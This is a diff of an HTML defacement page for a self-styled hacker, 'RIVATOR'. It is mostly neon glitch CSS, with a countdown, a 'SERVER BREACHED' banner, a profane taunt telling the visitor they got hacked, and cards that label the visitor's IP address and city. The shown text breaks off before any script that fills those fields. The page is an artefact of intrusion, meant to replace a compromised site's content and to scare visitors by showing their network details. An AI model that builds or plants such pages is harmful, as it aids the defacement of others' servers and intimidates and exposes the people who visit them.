@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HACKED BY RIVATOR</title>
+    <title>◢◤ RIVATOR - SYSTEM BREACHED ◢◤</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@600;700;800&display=swap');
-        
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@600;700;800&family=Share+Tech+Mono&family=Audiowide&display=swap');
+
         * {
             margin: 0;
             padding: 0;
@@ -15,25 +15,18 @@
             -moz-user-select: none;
             -ms-user-select: none;
             user-select: none;
-            -webkit-touch-callout: none;
-            -webkit-tap-highlight-color: transparent;
         }
 
         body {
             font-family: 'Rajdhani', sans-serif;
             background: #000;
             color: #fff;
-            overflow: hidden;
-            height: 100vh;
-            position: relative;
-            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><defs><linearGradient id="a" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%23ff00ff"/><stop offset="100%" style="stop-color:%2300ffff"/></linearGradient></defs><circle cx="16" cy="16" r="14" fill="url(%23a)" opacity="0.9"/><circle cx="12" cy="14" r="2" fill="%23fff"/><circle cx="20" cy="14" r="2" fill="%23fff"/><path d="M12 20c0 2 2 3.5 4 3.5s4-1.5 4-3.5" stroke="%23fff" stroke-width="2" fill="none" stroke-linecap="round"/></svg>') 16 16, auto;
+            overflow-x: hidden;
+            min-height: 100vh;
+            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="%2300ffff" opacity="0.3"/><circle cx="12" cy="12" r="2" fill="%23ff0000"/></svg>') 12 12, crosshair;
         }
 
-        a, button, .discord-button {
-            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><defs><linearGradient id="a" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%235865F2"/><stop offset="100%" style="stop-color:%237289DA"/></linearGradient></defs><circle cx="16" cy="16" r="14" fill="url(%23a)" opacity="0.9"/><circle cx="12" cy="14" r="2" fill="%23fff"/><circle cx="20" cy="14" r="2" fill="%23fff"/><path d="M12 20c0 2 2 3.5 4 3.5s4-1.5 4-3.5" stroke="%23fff" stroke-width="2" fill="none" stroke-linecap="round"/></svg>') 16 16, pointer;
-        }
-
-        /* Enhanced Background with Matrix Rain */
+        /* Enhanced Animated Background */
         .matrix-bg {
             position: fixed;
             top: 0;
@@ -41,240 +34,222 @@
             width: 100%;
             height: 100%;
             z-index: 0;
-            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000000 100%);
+            background: 
+                radial-gradient(ellipse at top, #1a0033 0%, #000 50%),
+                radial-gradient(ellipse at bottom, #001a33 0%, #000 50%);
         }
 
-        .matrix-rain {
-            position: absolute;
+        .cyber-grid {
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            overflow: hidden;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.15) 2px, transparent 2px),
+                linear-gradient(90deg, rgba(255, 0, 255, 0.15) 2px, transparent 2px),
+                linear-gradient(rgba(0, 255, 0, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 0, 0, 0.05) 1px, transparent 1px);
+            background-size: 100px 100px, 100px 100px, 20px 20px, 20px 20px;
+            z-index: 1;
+            animation: gridMove 30s linear infinite, gridPulse 5s ease-in-out infinite;
         }
 
-        .matrix-column {
-            position: absolute;
-            top: -100%;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            color: #0f0;
-            text-shadow: 0 0 5px #0f0;
-            animation: matrix-fall linear infinite;
-            opacity: 0.7;
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(100px, 100px); }
         }
 
-        @keyframes matrix-fall {
-            to {
-                transform: translateY(200vh);
-            }
+        @keyframes gridPulse {
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 0.7; }
         }
 
-        /* Audio Status Display - No Control */
-        .audio-status {
+        /* Matrix Rain Effect */
+        .matrix-rain {
             position: fixed;
-            top: 30px;
-            right: 30px;
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            background: linear-gradient(135deg, rgba(255, 0, 255, 0.1), rgba(0, 255, 255, 0.1));
-            padding: 15px 20px;
-            border-radius: 50px;
-            border: 2px solid transparent;
-            background-clip: padding-box;
-            backdrop-filter: blur(20px);
-            box-shadow: 
-                0 8px 32px rgba(255, 0, 255, 0.3),
-                inset 0 0 20px rgba(255, 255, 255, 0.1);
-            animation: audioFloat 3s ease-in-out infinite;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
             pointer-events: none;
-        }
-
-        @keyframes audioFloat {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .audio-indicator {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #ff00ff, #00ffff, #ffff00);
-            background-size: 300% 300%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: gradientShift 3s ease infinite, audioPulse 1.5s infinite;
-            position: relative;
             overflow: hidden;
         }
 
-        @keyframes audioPulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 255, 0.6); }
-            50% { box-shadow: 0 0 40px rgba(0, 255, 255, 0.9), 0 0 60px rgba(255, 255, 0, 0.6); }
-        }
-
-        .audio-waves {
-            display: flex;
-            align-items: center;
-            gap: 3px;
-            height: 20px;
-        }
-
-        .wave {
-            width: 3px;
-            background: #fff;
-            border-radius: 3px;
-            animation: wave 1.2s infinite ease-in-out;
-        }
-
-        .wave:nth-child(1) { animation-delay: 0s; height: 10px; }
-        .wave:nth-child(2) { animation-delay: 0.1s; height: 20px; }
-        .wave:nth-child(3) { animation-delay: 0.2s; height: 15px; }
-        .wave:nth-child(4) { animation-delay: 0.3s; height: 25px; }
-        .wave:nth-child(5) { animation-delay: 0.4s; height: 18px; }
-
-        @keyframes wave {
-            0%, 100% { transform: scaleY(0.5); }
-            50% { transform: scaleY(1); }
-        }
-
-        .audio-label {
-            color: #fff;
-            font-size: 16px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
-            animation: textGlow 2s ease-in-out infinite alternate;
-        }
-
-        @keyframes textGlow {
-            from { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }
-            to { text-shadow: 0 0 20px rgba(255, 255, 255, 1), 0 0 30px rgba(255, 0, 255, 0.8); }
-        }
-
-        /* Enhanced Particle System */
+        /* Particles Canvas */
         #particles-canvas {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 1;
+            z-index: 3;
+            pointer-events: none;
         }
 
-        /* Glitch Effect for RIVATOR */
+        /* Enhanced Glitch Effect */
         .glitch-wrapper {
             position: relative;
             z-index: 10;
-            padding: 20px;
-            height: 100vh;
+            width: 100%;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
+            gap: 50px;
+            padding: 80px 20px 150px;
         }
 
         .header {
             text-align: center;
-            margin-bottom: 80px;
             position: relative;
         }
 
         .header h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 6em;
+            font-family: 'Audiowide', cursive;
+            font-size: 3em;
             font-weight: 900;
-            letter-spacing: 15px;
+            color: #ff0000;
+            letter-spacing: 20px;
+            text-shadow: 
+                0 0 10px #ff0000,
+                0 0 20px #ff0000,
+                0 0 30px #ff0000,
+                0 0 40px #ff0000,
+                3px 3px 0 #00ffff,
+                -3px -3px 0 #ff00ff;
+            animation: glitchText 2s infinite, colorShift 6s infinite, shake 0.5s infinite;
             margin-bottom: 40px;
-            text-transform: uppercase;
-            background: linear-gradient(45deg, #ff00ff, #00ffff, #ffff00, #ff0080, #00ff80, #ff00ff);
-            background-size: 400% 400%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            animation: gradientShift 4s ease infinite, textGlow 2s ease-in-out infinite alternate;
-            text-shadow: 0 0 50px rgba(255, 0, 255, 0.8);
             position: relative;
         }
 
-        /* Enhanced RIVATOR Text */
+        @keyframes glitchText {
+            0% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(-3px, -3px); }
+            60% { transform: translate(3px, 3px); }
+            80% { transform: translate(3px, -3px); }
+            100% { transform: translate(0); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0) rotate(0deg); }
+            25% { transform: translateX(-2px) rotate(-0.5deg); }
+            75% { transform: translateX(2px) rotate(0.5deg); }
+        }
+
+        @keyframes colorShift {
+            0%, 100% { 
+                color: #ff0000; 
+                text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000, 3px 3px 0 #00ffff, -3px -3px 0 #ff00ff;
+            }
+            33% { 
+                color: #00ffff; 
+                text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff, 0 0 40px #00ffff, 3px 3px 0 #ff00ff, -3px -3px 0 #00ff00;
+            }
+            66% { 
+                color: #ff00ff; 
+                text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 30px #ff00ff, 0 0 40px #ff00ff, 3px 3px 0 #00ff00, -3px -3px 0 #ff0000;
+            }
+        }
+
+        /* Small Countdown in corner */
+        .mini-countdown {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 0, 0, 0.2);
+            border: 2px solid #ff0000;
+            padding: 15px 25px;
+            border-radius: 10px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5em;
+            color: #ff0000;
+            text-shadow: 0 0 15px #ff0000;
+            z-index: 9000;
+            backdrop-filter: blur(10px);
+            animation: miniPulse 1s infinite;
+        }
+
+        @keyframes miniPulse {
+            0%, 100% { 
+                box-shadow: 0 0 20px rgba(255,0,0,0.5);
+                transform: scale(1);
+            }
+            50% { 
+                box-shadow: 0 0 40px rgba(255,0,0,0.9);
+                transform: scale(1.05);
+            }
+        }
+
+        /* Hack Message */
+        .hack-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.95);
+            border: 5px solid #ff0000;
+            padding: 50px 80px;
+            border-radius: 20px;
+            font-family: 'Audiowide', cursive;
+            font-size: 2.5em;
+            color: #ff0000;
+            text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000;
+            z-index: 10000;
+            display: none;
+            text-align: center;
+            box-shadow: 0 0 100px rgba(255,0,0,1), inset 0 0 50px rgba(255,0,0,0.3);
+            animation: hackPulse 0.5s infinite;
+            line-height: 1.5;
+        }
+
+        @keyframes hackPulse {
+            0%, 100% { 
+                transform: translate(-50%, -50%) scale(1);
+            }
+            50% { 
+                transform: translate(-50%, -50%) scale(1.05);
+            }
+        }
+
+        .hack-message .subtitle {
+            font-size: 0.6em;
+            color: #00ffff;
+            text-shadow: 0 0 20px #00ffff;
+            margin-top: 20px;
+        }
+
+        /* Rivator Text - Ultra Enhanced */
         .rivator-container {
             position: relative;
-            display: inline-block;
+            padding: 30px;
+            perspective: 1000px;
         }
 
         .rivator-text {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 8em;
+            font-family: 'Audiowide', cursive;
+            font-size: 6em;
             font-weight: 900;
             letter-spacing: 20px;
-            text-transform: uppercase;
-            position: relative;
-            z-index: 2;
-            animation: rivatorMain 3s ease-in-out infinite;
-        }
-
-        .rivator-text::before,
-        .rivator-text::after {
-            content: 'HACKED BY RIVATOR';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, #ff00ff, #00ffff, #ffff00, #ff0080);
+            background: linear-gradient(45deg, #00ffff, #ff00ff, #00ff00, #ff0000, #00ffff);
             background-size: 400% 400%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            z-index: -1;
-        }
-
-        .rivator-text::before {
-            animation: glitch1 0.5s infinite;
-            color: #00ffff;
-            text-shadow: 0 0 20px #00ffff;
-        }
-
-        .rivator-text::after {
-            animation: glitch2 0.5s infinite;
-            color: #ff00ff;
-            text-shadow: 0 0 20px #ff00ff;
-        }
-
-        @keyframes glitch1 {
-            0%, 100% { clip-path: inset(0 0 0 0); transform: translate(0); }
-            20% { clip-path: inset(20% 0 30% 0); transform: translate(-2px, 2px); }
-            40% { clip-path: inset(50% 0 20% 0); transform: translate(2px, -2px); }
-            60% { clip-path: inset(10% 0 60% 0); transform: translate(-1px, 1px); }
-            80% { clip-path: inset(80% 0 5% 0); transform: translate(1px, -1px); }
-        }
-
-        @keyframes glitch2 {
-            0%, 100% { clip-path: inset(0 0 0 0); transform: translate(0); }
-            20% { clip-path: inset(60% 0 10% 0); transform: translate(2px, -2px); }
-            40% { clip-path: inset(20% 0 50% 0); transform: translate(-2px, 2px); }
-            60% { clip-path: inset(30% 0 40% 0); transform: translate(1px, -1px); }
-            80% { clip-path: inset(5% 0 80% 0); transform: translate(-1px, 1px); }
-        }
-
-        @keyframes rivatorMain {
-            0%, 100% {
-                filter: drop-shadow(0 0 20px rgba(255, 0, 255, 0.8)) 
-                        drop-shadow(0 0 40px rgba(0, 255, 255, 0.6))
-                        drop-shadow(0 0 60px rgba(255, 255, 0, 0.4));
-                transform: scale(1);
-            }
-            50% {
-                filter: drop-shadow(0 0 30px rgba(255, 0, 255, 1)) 
-                        drop-shadow(0 0 60px rgba(0, 255, 255, 0.8))
-                        drop-shadow(0 0 90px rgba(255, 255, 0, 0.6));
-                transform: scale(1.05);
-            }
+            animation: 
+                gradientShift 4s ease infinite, 
+                textPulse 3s ease-in-out infinite, 
+                textFloat 4s ease-in-out infinite,
+                textRotate 10s linear infinite;
+            position: relative;
+            filter: 
+                drop-shadow(0 0 30px #00ffff) 
+                drop-shadow(0 0 60px #ff00ff)
+                drop-shadow(0 0 90px #00ff00);
+            transform-style: preserve-3d;
         }
 
         @keyframes gradientShift {
@@ -283,243 +258,300 @@
             100% { background-position: 0% 50%; }
         }
 
-        /* Enhanced Info Cards */
-        .info-grid {
-            display: none;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px;
-            width: 90%;
-            max-width: 1400px;
-            margin-top: 60px;
+        @keyframes textPulse {
+            0%, 100% { transform: scale(1) translateZ(0); }
+            50% { transform: scale(1.08) translateZ(20px); }
         }
 
-        .info-grid.show {
+        @keyframes textFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        @keyframes textRotate {
+            0% { filter: drop-shadow(0 0 30px #00ffff) drop-shadow(0 0 60px #ff00ff) drop-shadow(0 0 90px #00ff00) hue-rotate(0deg); }
+            100% { filter: drop-shadow(0 0 30px #00ffff) drop-shadow(0 0 60px #ff00ff) drop-shadow(0 0 90px #00ff00) hue-rotate(360deg); }
+        }
+
+        /* Info Grid - Ultra Enhanced */
+        .info-grid {
             display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            max-width: 1600px;
+            padding: 0 30px;
+            width: 100%;
         }
 
         .info-card {
-            background: linear-gradient(135deg, rgba(255, 0, 255, 0.05), rgba(0, 255, 255, 0.05));
-            backdrop-filter: blur(15px);
-            border: 2px solid transparent;
-            border-radius: 20px;
-            padding: 30px;
+            background: linear-gradient(135deg, rgba(0, 255, 255, 0.1), rgba(255, 0, 255, 0.1));
+            border: 3px solid transparent;
+            background-clip: padding-box;
             position: relative;
+            padding: 30px;
+            text-align: center;
             overflow: hidden;
+            backdrop-filter: blur(15px);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            animation: cardFadeIn 1s forwards;
-            opacity: 0;
+            animation: cardFloat 4s ease-in-out infinite;
             transform-style: preserve-3d;
-            perspective: 1000px;
         }
 
         .info-card::before {
             content: '';
             position: absolute;
             top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            animation: shine 3s infinite;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border-radius: inherit;
+            padding: 3px;
+            background: linear-gradient(45deg, #00ffff, #ff00ff, #00ff00, #ff0000, #00ffff);
+            background-size: 400% 400%;
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            animation: borderGlow 4s ease infinite;
+            z-index: -1;
+        }
+
+        @keyframes borderGlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes cardFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
         }
 
         .info-card:hover {
-            transform: translateY(-15px) rotateX(5deg) scale(1.08);
-            border-color: #ff00ff;
+            transform: translateY(-15px) scale(1.05) rotateX(5deg);
             box-shadow: 
-                0 20px 40px rgba(255, 0, 255, 0.4),
-                0 0 60px rgba(0, 255, 255, 0.3),
-                inset 0 0 30px rgba(255, 0, 255, 0.2);
-        }
-
-        .info-card:nth-child(1) { animation-delay: 0.1s; }
-        .info-card:nth-child(2) { animation-delay: 0.2s; }
-        .info-card:nth-child(3) { animation-delay: 0.3s; }
-        .info-card:nth-child(4) { animation-delay: 0.4s; }
-        .info-card:nth-child(5) { animation-delay: 0.5s; }
-        .info-card:nth-child(6) { animation-delay: 0.6s; }
-
-        @keyframes cardFadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(50px) rotateX(-10deg);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) rotateX(0);
-            }
-        }
-
-        @keyframes shine {
-            0% { left: -100%; }
-            100% { left: 100%; }
+                0 20px 60px rgba(0, 255, 255, 0.4),
+                0 20px 60px rgba(255, 0, 255, 0.4),
+                inset 0 0 30px rgba(0, 255, 255, 0.2);
         }
 
         .info-label {
+            font-family: 'Share Tech Mono', monospace;
             font-size: 1em;
             color: #00ffff;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin-bottom: 15px;
+            text-shadow: 0 0 15px #00ffff, 0 0 30px #00ffff;
+            margin-bottom: 20px;
+            letter-spacing: 4px;
             font-weight: 700;
-            text-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
+            position: relative;
+            z-index: 1;
+            animation: labelPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes labelPulse {
+            0%, 100% { text-shadow: 0 0 15px #00ffff, 0 0 30px #00ffff; }
+            50% { text-shadow: 0 0 25px #00ffff, 0 0 50px #00ffff, 0 0 75px #00ffff; }
         }
 
         .info-value {
+            font-family: 'Orbitron', sans-serif;
             font-size: 1.5em;
-            color: #ffff00;
-            font-weight: 800;
-            text-shadow: 
-                0 0 15px rgba(255, 255, 0, 1),
-                0 0 30px rgba(255, 255, 0, 0.7);
-            word-break: break-word;
+            color: #fff;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.9);
+            font-weight: 700;
+            position: relative;
+            z-index: 1;
+            animation: valueGlow 3s ease-in-out infinite;
+            word-break: break-all;
         }
 
-        /* Enhanced Discord Button */
+        .info-value.loading {
+            color: #ff00ff;
+            animation: loadingPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes loadingPulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.6; transform: scale(0.95); }
+        }
+
+        @keyframes valueGlow {
+            0%, 100% { 
+                text-shadow: 0 0 20px rgba(255, 255, 255, 0.9); 
+                color: #fff;
+            }
+            33% { 
+                text-shadow: 0 0 30px rgba(0, 255, 255, 1), 0 0 50px rgba(0, 255, 255, 0.5); 
+                color: #00ffff;
+            }
+            66% { 
+                text-shadow: 0 0 30px rgba(255, 0, 255, 1), 0 0 50px rgba(255, 0, 255, 0.5); 
+                color: #ff00ff;
+            }
+        }
+
+        /* Discord Button - Ultra Enhanced */
         .discord-button {
             position: fixed;
-            bottom: 40px;
+            bottom: 60px;
             left: 50%;
             transform: translateX(-50%);
-            z-index: 1000;
-            padding: 20px 45px;
             background: linear-gradient(135deg, #5865F2, #7289DA, #5865F2);
             background-size: 200% 200%;
-            border: none;
-            border-radius: 15px;
             color: #fff;
-            font-size: 1.2em;
+            font-family: 'Audiowide', cursive;
+            font-size: 1.3em;
             font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            padding: 25px 50px;
+            border: 4px solid #fff;
+            border-radius: 60px;
             text-decoration: none;
-            cursor: pointer;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 
-                0 10px 30px rgba(88, 101, 242, 0.5),
-                0 0 0 2px rgba(255, 255, 255, 0.2) inset;
-            backdrop-filter: blur(15px);
             display: flex;
             align-items: center;
-            gap: 15px;
-            font-family: 'Rajdhani', sans-serif;
-            animation: discordFloat 3s ease-in-out infinite;
-        }
-
-        @keyframes discordFloat {
-            0%, 100% { transform: translateX(-50%) translateY(0); }
-            50% { transform: translateX(-50%) translateY(-5px); }
+            gap: 20px;
+            z-index: 100;
+            box-shadow: 
+                0 0 40px rgba(88, 101, 242, 0.9), 
+                0 0 80px rgba(114, 137, 218, 0.7),
+                inset 0 0 20px rgba(255, 255, 255, 0.2);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            animation: buttonPulse 2.5s ease-in-out infinite, buttonFloat 3s ease-in-out infinite;
+            cursor: pointer;
         }
 
         .discord-button:hover {
-            transform: translateX(-50%) translateY(-8px) scale(1.08);
+            transform: translateX(-50%) scale(1.15) translateY(-10px);
             box-shadow: 
-                0 15px 40px rgba(88, 101, 242, 0.7),
-                0 0 0 3px rgba(255, 255, 255, 0.3) inset;
-            background-position: 100% 0;
+                0 0 70px rgba(88, 101, 242, 1), 
+                0 0 140px rgba(114, 137, 218, 1),
+                inset 0 0 30px rgba(255, 255, 255, 0.3);
+            background-position: 100% 50%;
         }
 
-        .discord-button:active {
-            transform: translateX(-50%) translateY(-3px) scale(1.05);
+        @keyframes buttonPulse {
+            0%, 100% { 
+                box-shadow: 0 0 40px rgba(88, 101, 242, 0.9), 0 0 80px rgba(114, 137, 218, 0.7), inset 0 0 20px rgba(255, 255, 255, 0.2);
+            }
+            50% { 
+                box-shadow: 0 0 70px rgba(88, 101, 242, 1), 0 0 140px rgba(114, 137, 218, 0.9), inset 0 0 30px rgba(255, 255, 255, 0.3);
+            }
+        }
+
+        @keyframes buttonFloat {
+            0%, 100% { transform: translateX(-50%) translateY(0); }
+            50% { transform: translateX(-50%) translateY(-8px); }
         }
 
         .discord-icon {
-            width: 30px;
-            height: 30px;
+            width: 35px;
+            height: 35px;
             fill: currentColor;
-            flex-shrink: 0;
-            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.8));
+            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.9));
+            animation: iconSpin 10s linear infinite;
         }
 
-        /* Enhanced Background Effects */
-        .cyber-grid {
+        @keyframes iconSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Scan Lines Effect */
+        .scanlines {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: 
-                linear-gradient(rgba(255, 0, 255, 0.1) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255, 0, 255, 0.1) 1px, transparent 1px);
-            background-size: 50px 50px;
-            z-index: 0;
-            animation: gridMove 20s linear infinite;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.2),
+                rgba(0, 0, 0, 0.2) 1px,
+                transparent 1px,
+                transparent 3px
+            );
+            pointer-events: none;
+            z-index: 500;
+            animation: scan 10s linear infinite;
+            opacity: 0.5;
         }
 
-        @keyframes gridMove {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(50px, 50px); }
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(20px); }
         }
 
         /* Responsive Design */
         @media (max-width: 768px) {
             .header h1 {
-                font-size: 3em;
-                letter-spacing: 8px;
+                font-size: 1.8em;
+                letter-spacing: 10px;
             }
             .rivator-text {
-                font-size: 4em;
+                font-size: 3.5em;
                 letter-spacing: 10px;
             }
             .info-grid {
                 grid-template-columns: 1fr;
-                gap: 20px;
+                gap: 25px;
+                padding: 0 20px;
             }
             .discord-button {
-                font-size: 1em;
-                padding: 15px 30px;
-                bottom: 30px;
+                font-size: 1.1em;
+                padding: 20px 35px;
+                bottom: 40px;
             }
-            .audio-status {
-                top: 20px;
-                right: 20px;
+            .mini-countdown {
+                top: 10px;
+                right: 10px;
                 padding: 10px 15px;
+                font-size: 1.2em;
             }
-            .audio-indicator {
-                width: 40px;
-                height: 40px;
-            }
-            .audio-label {
-                font-size: 14px;
+            .hack-message {
+                font-size: 1.5em;
+                padding: 30px 40px;
             }
         }
-        
+
         @media (max-width: 480px) {
             .rivator-text {
-                font-size: 2.5em;
-                letter-spacing: 5px;
+                font-size: 2.2em;
+                letter-spacing: 6px;
             }
-            .audio-label {
-                display: none;
+            .header h1 {
+                font-size: 1.3em;
+                letter-spacing: 6px;
+            }
+            .discord-button {
+                font-size: 0.9em;
+                padding: 15px 25px;
+            }
+            .info-value {
+                font-size: 1.2em;
             }
         }
     </style>
 </head>
 <body>
+    <!-- Mini Countdown in corner -->
+    <div class="mini-countdown" id="mini-countdown">00:05</div>
+
+    <!-- Hack Message -->
+    <div class="hack-message" id="hack-message">
+        OOPS<br>RIVATOR GOT ACCESS
+        <div class="subtitle">u get fucked :(</div>
+    </div>
+
+    <!-- Scan Lines Effect -->
+    <div class="scanlines"></div>
+
     <!-- Enhanced Background -->
     <div class="matrix-bg">
         <div class="cyber-grid"></div>
         <div class="matrix-rain" id="matrix-rain"></div>
     </div>
 
-    <!-- Audio Status Display - No Control -->
-    <div class="audio-status">
-        <div class="audio-indicator">
-            <div class="audio-waves">
-                <div class="wave"></div>
-                <div class="wave"></div>
-                <div class="wave"></div>
-                <div class="wave"></div>
-                <div class="wave"></div>
-            </div>
-        </div>
-        <span class="audio-label">Music Playing</span>
-    </div>
-
-    <!-- Audio Element - Starts at 10 seconds -->
-    <audio id="background-music" loop autoplay>
-        <source src="https://rr1---sn-h5qzen7l.googlevideo.com/videoplayback?expire=1764146144&ei=gGcmaevJLc7mpskPpLerEA&ip=58.186.216.119&id=o-AEyFfMzMyxGEpKla5oK2Pz2-XW_3BZRw7H7h3lpENLsk&itag=251&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&cps=0&bui=AdEuB5QGrFr462xWyYCSwf9k5P0MvMPZwuhzSTQSaPkb74gBQN4qLFOot3O9IWOQf9Pab9JqidHLH-vu&vprv=1&svpuc=1&mime=audio%2Fwebm&ns=tC_jS6qMvmlcl1hx0k9BybYQ&rqh=1&gir=yes&clen=3357108&dur=207.801&lmt=1747588152550308&keepalive=yes&lmw=1&fexp=51557447,51565115,51565681,51580970,51626155&c=TVHTML5&sefc=1&txp=5532534&n=W3Q3826JZ0lSUA&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cbui%2Cvprv%2Csvpuc%2Cmime%2Cns%2Crqh%2Cgir%2Cclen%2Cdur%2Clmt&sig=AJfQdSswRQIhAIulHlOvyr_XAoD9Up-qfHotZHH5s0uvf2KV1td5cvB3AiAMaekarTJ2XNMXbLWY8ZABQLtirmns4rScVKksTOVy1Q%3D%3D&rm=sn-42u-i5oer7e,sn-i3bk77l&rrc=79,104&req_id=6c6880c92af4a3ee&cmsv=e&rms=nxu,au&redirect_counter=2&cms_redirect=yes&ipbypass=yes&met=1764124559,&mh=M3&mip=154.255.6.38&mm=30&mn=sn-h5qzen7l&ms=nxu&mt=1764123078&mv=u&mvi=1&pl=23&lsparams=cps,ipbypass,met,mh,mip,mm,mn,ms,mv,mvi,pl,rms&lsig=APaTxxMwRQIgQ_QZQNLVVpD3RctT_C8OsWmryncGu8tmPsHopNG8FpkCIQCMtErh77vPh36DaQcb42K4ozO88Nju3XlgBV7mquAZoA%3D%3D" type="audio/webm">
-        Your browser does not support the audio element.
+    <!-- Audio Element -->
+    <audio id="background-music" loop>
+        <source src="https://cdn.discordapp.com/attachments/1415911375938650142/1444462659205337188/Code_Red_-_18_English_Version_Official_Music_Video.mp3?ex=692ccc2e&is=692b7aae&hm=761508392dde3957a24848eebb87d71a5a47982d28e1085f3e02058af701e021&" type="audio/mpeg">
     </audio>
 
     <!-- Enhanced Particles Canvas -->
@@ -528,337 +560,330 @@
     <!-- Main Content -->
     <div class="glitch-wrapper">
         <div class="header">
-            <h1>[SERVER HACKED]</h1>
+            <h1>◢◤ SERVER BREACHED ◢◤</h1>
             <div class="rivator-container">
-                <div class="rivator-text">HACKED BY RIVATOR</div>
+                <div class="rivator-text">◢ RIVATOR IS HERE ◣</div>
             </div>
         </div>
 
         <div class="info-grid" id="info-grid">
             <div class="info-card">
-                <div class="info-label">IP ADDRESS</div>
-                <div class="info-value" id="ip-address"></div>
+                <div class="info-label">⚡ YOUR IP ADDRESS</div>
+                <div class="info-value loading" id="ip">SCANNING...</div>
             </div>
             <div class="info-card">
-                <div class="info-label">LOCATION</div>
-                <div class="info-value" id="location"></div>
+                <div class="info-label">🏙️ CITY</div>
